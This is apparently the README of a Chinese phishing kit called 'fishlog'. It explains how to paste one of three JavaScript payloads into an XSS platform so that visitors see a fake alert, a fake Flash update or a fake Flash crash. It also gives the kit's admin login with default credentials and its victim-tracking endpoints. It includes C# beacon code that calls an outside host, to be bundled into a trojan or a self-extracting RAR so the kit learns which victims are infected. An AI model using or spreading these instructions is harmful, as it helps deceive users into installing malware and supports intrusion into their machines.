## 使用方法 
/nicaibudao/fish/hack1.js

/nicaibudao/fish/hack2.js

/nicaibudao/fish/hack3.js

三个Javascript文件

效果

hack1.js为alert弹窗

hack2.js为仿真版flash更新

hack3.js为灰色flash崩溃

任选其一

配合XSS平台将选择的js全部复制进入XSS平台代码中，什么也不用选，点击下一步即可

![](http://39.108.181.144:61262/static/1.png)

之后就和XSS公共模块使用方法一样

hack.js中的跳转地址需要自行进行修改  默认均为baidu.com

------

登陆地址

```
http://127.0.0.1/fishlog/public/index.php/admins/account/login
```

初始账号:admin       初始密码: 123456        

数据库名称 : fishlog


------



访问情况接口 :

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/index
```

注:程序只有搭建在服务器上  才能获取IP  在本地都会是127.0.0.1



上钩鱼儿接口 : 存在这里的IP不会再进行flash更新/崩溃等钓鱼操作

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/onhook
```



上钩鱼儿接口使用：将下述代码封装进马子，或者和马子捆绑，或者rar自解压即可

```c#
using System;
using System.Net;
using System.Threading;

namespace testHttp
{
    class Program
    {
        static void Main(string[] args)
        {
            ThreadStart childref = new ThreadStart(sendLog);
            Thread childThread = new Thread(childref);
            childThread.Start();
        }

        public static void sendLog()
        {
            string url = "http://hackerc.com/api.php?m=api&do=myLogk";
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
            request.Method = "HEAD";
            request.Timeout = 100000;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        }
    }
}
```



参考:

https://www.moonsec.com/archives/2546
https://www.t00ls.net/viewthread.php?tid=57827&extra=&highlight=flash&page=1
https://www.t00ls.net/viewthread.php?tid=58890&highlight=flash

